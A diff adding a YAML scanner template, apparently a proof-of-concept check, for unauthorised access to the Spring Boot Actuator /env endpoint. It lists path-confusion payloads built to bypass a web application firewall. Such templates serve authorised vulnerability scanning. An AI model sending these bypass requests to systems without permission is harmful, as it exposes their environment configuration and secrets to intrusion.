@@ -1,0 +1,31 @@
+id: poc-yaml-spring-boot-actuator-unauthorized-access-bypass-waf
+info:
+  name: Spring Boot Actuator 未授权访问漏洞(WAF 绕过)
+  severity: high
+  tags:
+  - 未授权访问
+  finger: spring_boot
+variables:
+  r_path: '/actuator;/env;.css
+
+    /api/actuator;/env;.css
+
+    /api;/env;.css
+
+    /;/env;.css
+
+    /;/actuator;/env
+
+    /actuator;x/env
+
+    /actuator;%2f../env'
+requests:
+- method: GET
+  path: '{{.r_path}}'
+  headers: {}
+  expression: 'status_code == 200 && contains(body, "java.runtime.version")
+
+    && contains(body, "{")
+
+    '
+transport: http
